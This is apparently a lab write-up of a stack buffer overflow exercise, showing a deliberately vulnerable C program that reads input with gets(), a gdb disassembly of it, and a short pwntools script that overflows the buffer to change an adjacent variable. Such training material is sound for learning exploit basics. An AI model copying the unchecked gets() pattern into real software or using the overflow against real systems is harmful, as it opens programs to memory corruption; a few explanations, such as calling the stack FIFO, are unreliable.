# Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
- We have 2 variables *modified* and *buffer* which are created in the stack.
- *modified* is an integer that the program checks to see if it's been altered unexpectedly. The `volatile` keyword is used to tell the compiler not to optimize this variable, as its value could be changed unexpectedly or arbitrarily.
- The *gets()* function is used -- input is loaded into buffer using *gets()*
- *gets()* is dangerous as it can be easily abused for buffer over flow.
- This is because *gets()* doesn't have a check for the number of inputs given in the stack, and it keep receiving input until the stack crashes -- which of course leads to stack buffer overflow.
- Knowing this we can overwrite the memory region where the *modified* variable is stored.

# Investigating further

Running `man gets` 
![Pasted image 20240709223941](https://github.com/husseinmuhaisen/husseinmuhaisen.github.io/assets/59100756/b4c32f48-9808-494e-a0f6-5026a24d1868)
![Pasted image 20240709224151](https://github.com/husseinmuhaisen/husseinmuhaisen.github.io/assets/59100756/eb6cf375-7356-4120-b574-c33e39455bce)



# The stack

#### EIP (Instruction Pointer)

The EIP register holds the memory address of the next instruction to be executed. It is not stored on the stack itself, but rather it is an architectural register in the CPU. **The EIP is used to keep track of the currently executing code.**

#### ESP (Stack Pointer)

The ESP register points to the top of the stack, which is the most recently pushed value. It is not directly stored on the stack, but it holds the memory address of the top of the stack. **ESP is used to access and manipulate data on the stack.**

#### EBP (Base Pointer)

The EBP register is used as a reference point for accessing local variables and function arguments on the stack. It is typically set to the value of ESP at the beginning of a function, providing a stable base address for referencing stack data. **EBP is pushed onto the stack when a function is called, and it is popped off when the function returns.**


- First the *modified* variable gets created, i.e. it gets pushed onto the stack(FIFO).
- Then the *buffer* which is an array of 64 characters gets created.
- *modified* variable gets pushed down to the stack.


# Disassembly 
We are going to disassemble our binary using *gdb/gef*

![Pasted image 20240709233340](https://github.com/husseinmuhaisen/husseinmuhaisen.github.io/assets/59100756/f9462062-6acd-4f24-84e6-173dea56ff70)


# Disassembling the main function
```
gef➤  disassemble main 
Dump of assembler code for function main:
   0x0000000000001149 <+0>:	push   rbp
   0x000000000000114a <+1>:	mov    rbp,rsp
   0x000000000000114d <+4>:	sub    rsp,0x60
   0x0000000000001151 <+8>:	mov    DWORD PTR [rbp-0x54],edi
   0x0000000000001154 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000001158 <+15>:	mov    DWORD PTR [rbp-0x4],0x0
   0x000000000000115f <+22>:	lea    rax,[rbp-0x50]
   0x0000000000001163 <+26>:	mov    rdi,rax
   0x0000000000001166 <+29>:	mov    eax,0x0
   0x000000000000116b <+34>:	call   0x1040 <gets@plt>
   0x0000000000001170 <+39>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001173 <+42>:	test   eax,eax
   0x0000000000001175 <+44>:	je     0x1188 <main+63>
   0x0000000000001177 <+46>:	lea    rax,[rip+0xe8a]        # 0x2008
   0x000000000000117e <+53>:	mov    rdi,rax
   0x0000000000001181 <+56>:	call   0x1030 <puts@plt>
   0x0000000000001186 <+61>:	jmp    0x1197 <main+78>
   0x0000000000001188 <+63>:	lea    rax,[rip+0xea2]        # 0x2031
   0x000000000000118f <+70>:	mov    rdi,rax
   0x0000000000001192 <+73>:	call   0x1030 <puts@plt>
   0x0000000000001197 <+78>:	mov    eax,0x0
   0x000000000000119c <+83>:	leave
   0x000000000000119d <+84>:	ret
End of assembler dump.
gef➤  

```

The `modified` variable and the buffer are separate variables in the program. However, due to the way memory is organized in the stack, these variables are located next to each other. When the `gets` function is called to read input into the buffer, and if the input is longer than the size of the buffer, it will overflow into the memory space of the `modified` variable, effectively changing its value.

- We are going to set **2** breakpoints before and after the **gets()** function to see what registers have changed.
```
gef➤  break *0x000000000000116b
Breakpoint 1 at 0x116b
gef➤  break *0x0000000000001170
Breakpoint 2 at 0x1170
```
- The first breakpoint is set at the **gets()** function.
- The second breakpoints is set at the instruction that loads the value of the **modified** variable.
- Doing the above, we will get an idea on where the data on the stack is stored.


# Using pwntools to exploit the binary

```
from pwn import *

# Establish a process to the binary
p = process('/opt/exploitdev/stacked')

# Create the payload
# The 'A'*80 will overflow the buffer and modify the 'modified' variable
payload = ('A'*80).encode()

# Send the payload
p.sendline(payload)

# Receive the output
output = p.recvline()

# Print the output
print(output)

# Close the process
p.close()

```

![Pasted image 20240710130427](https://github.com/husseinmuhaisen/husseinmuhaisen.github.io/assets/59100756/00c3b37c-5596-4efb-9c75-391ac472270f)


Thank you.
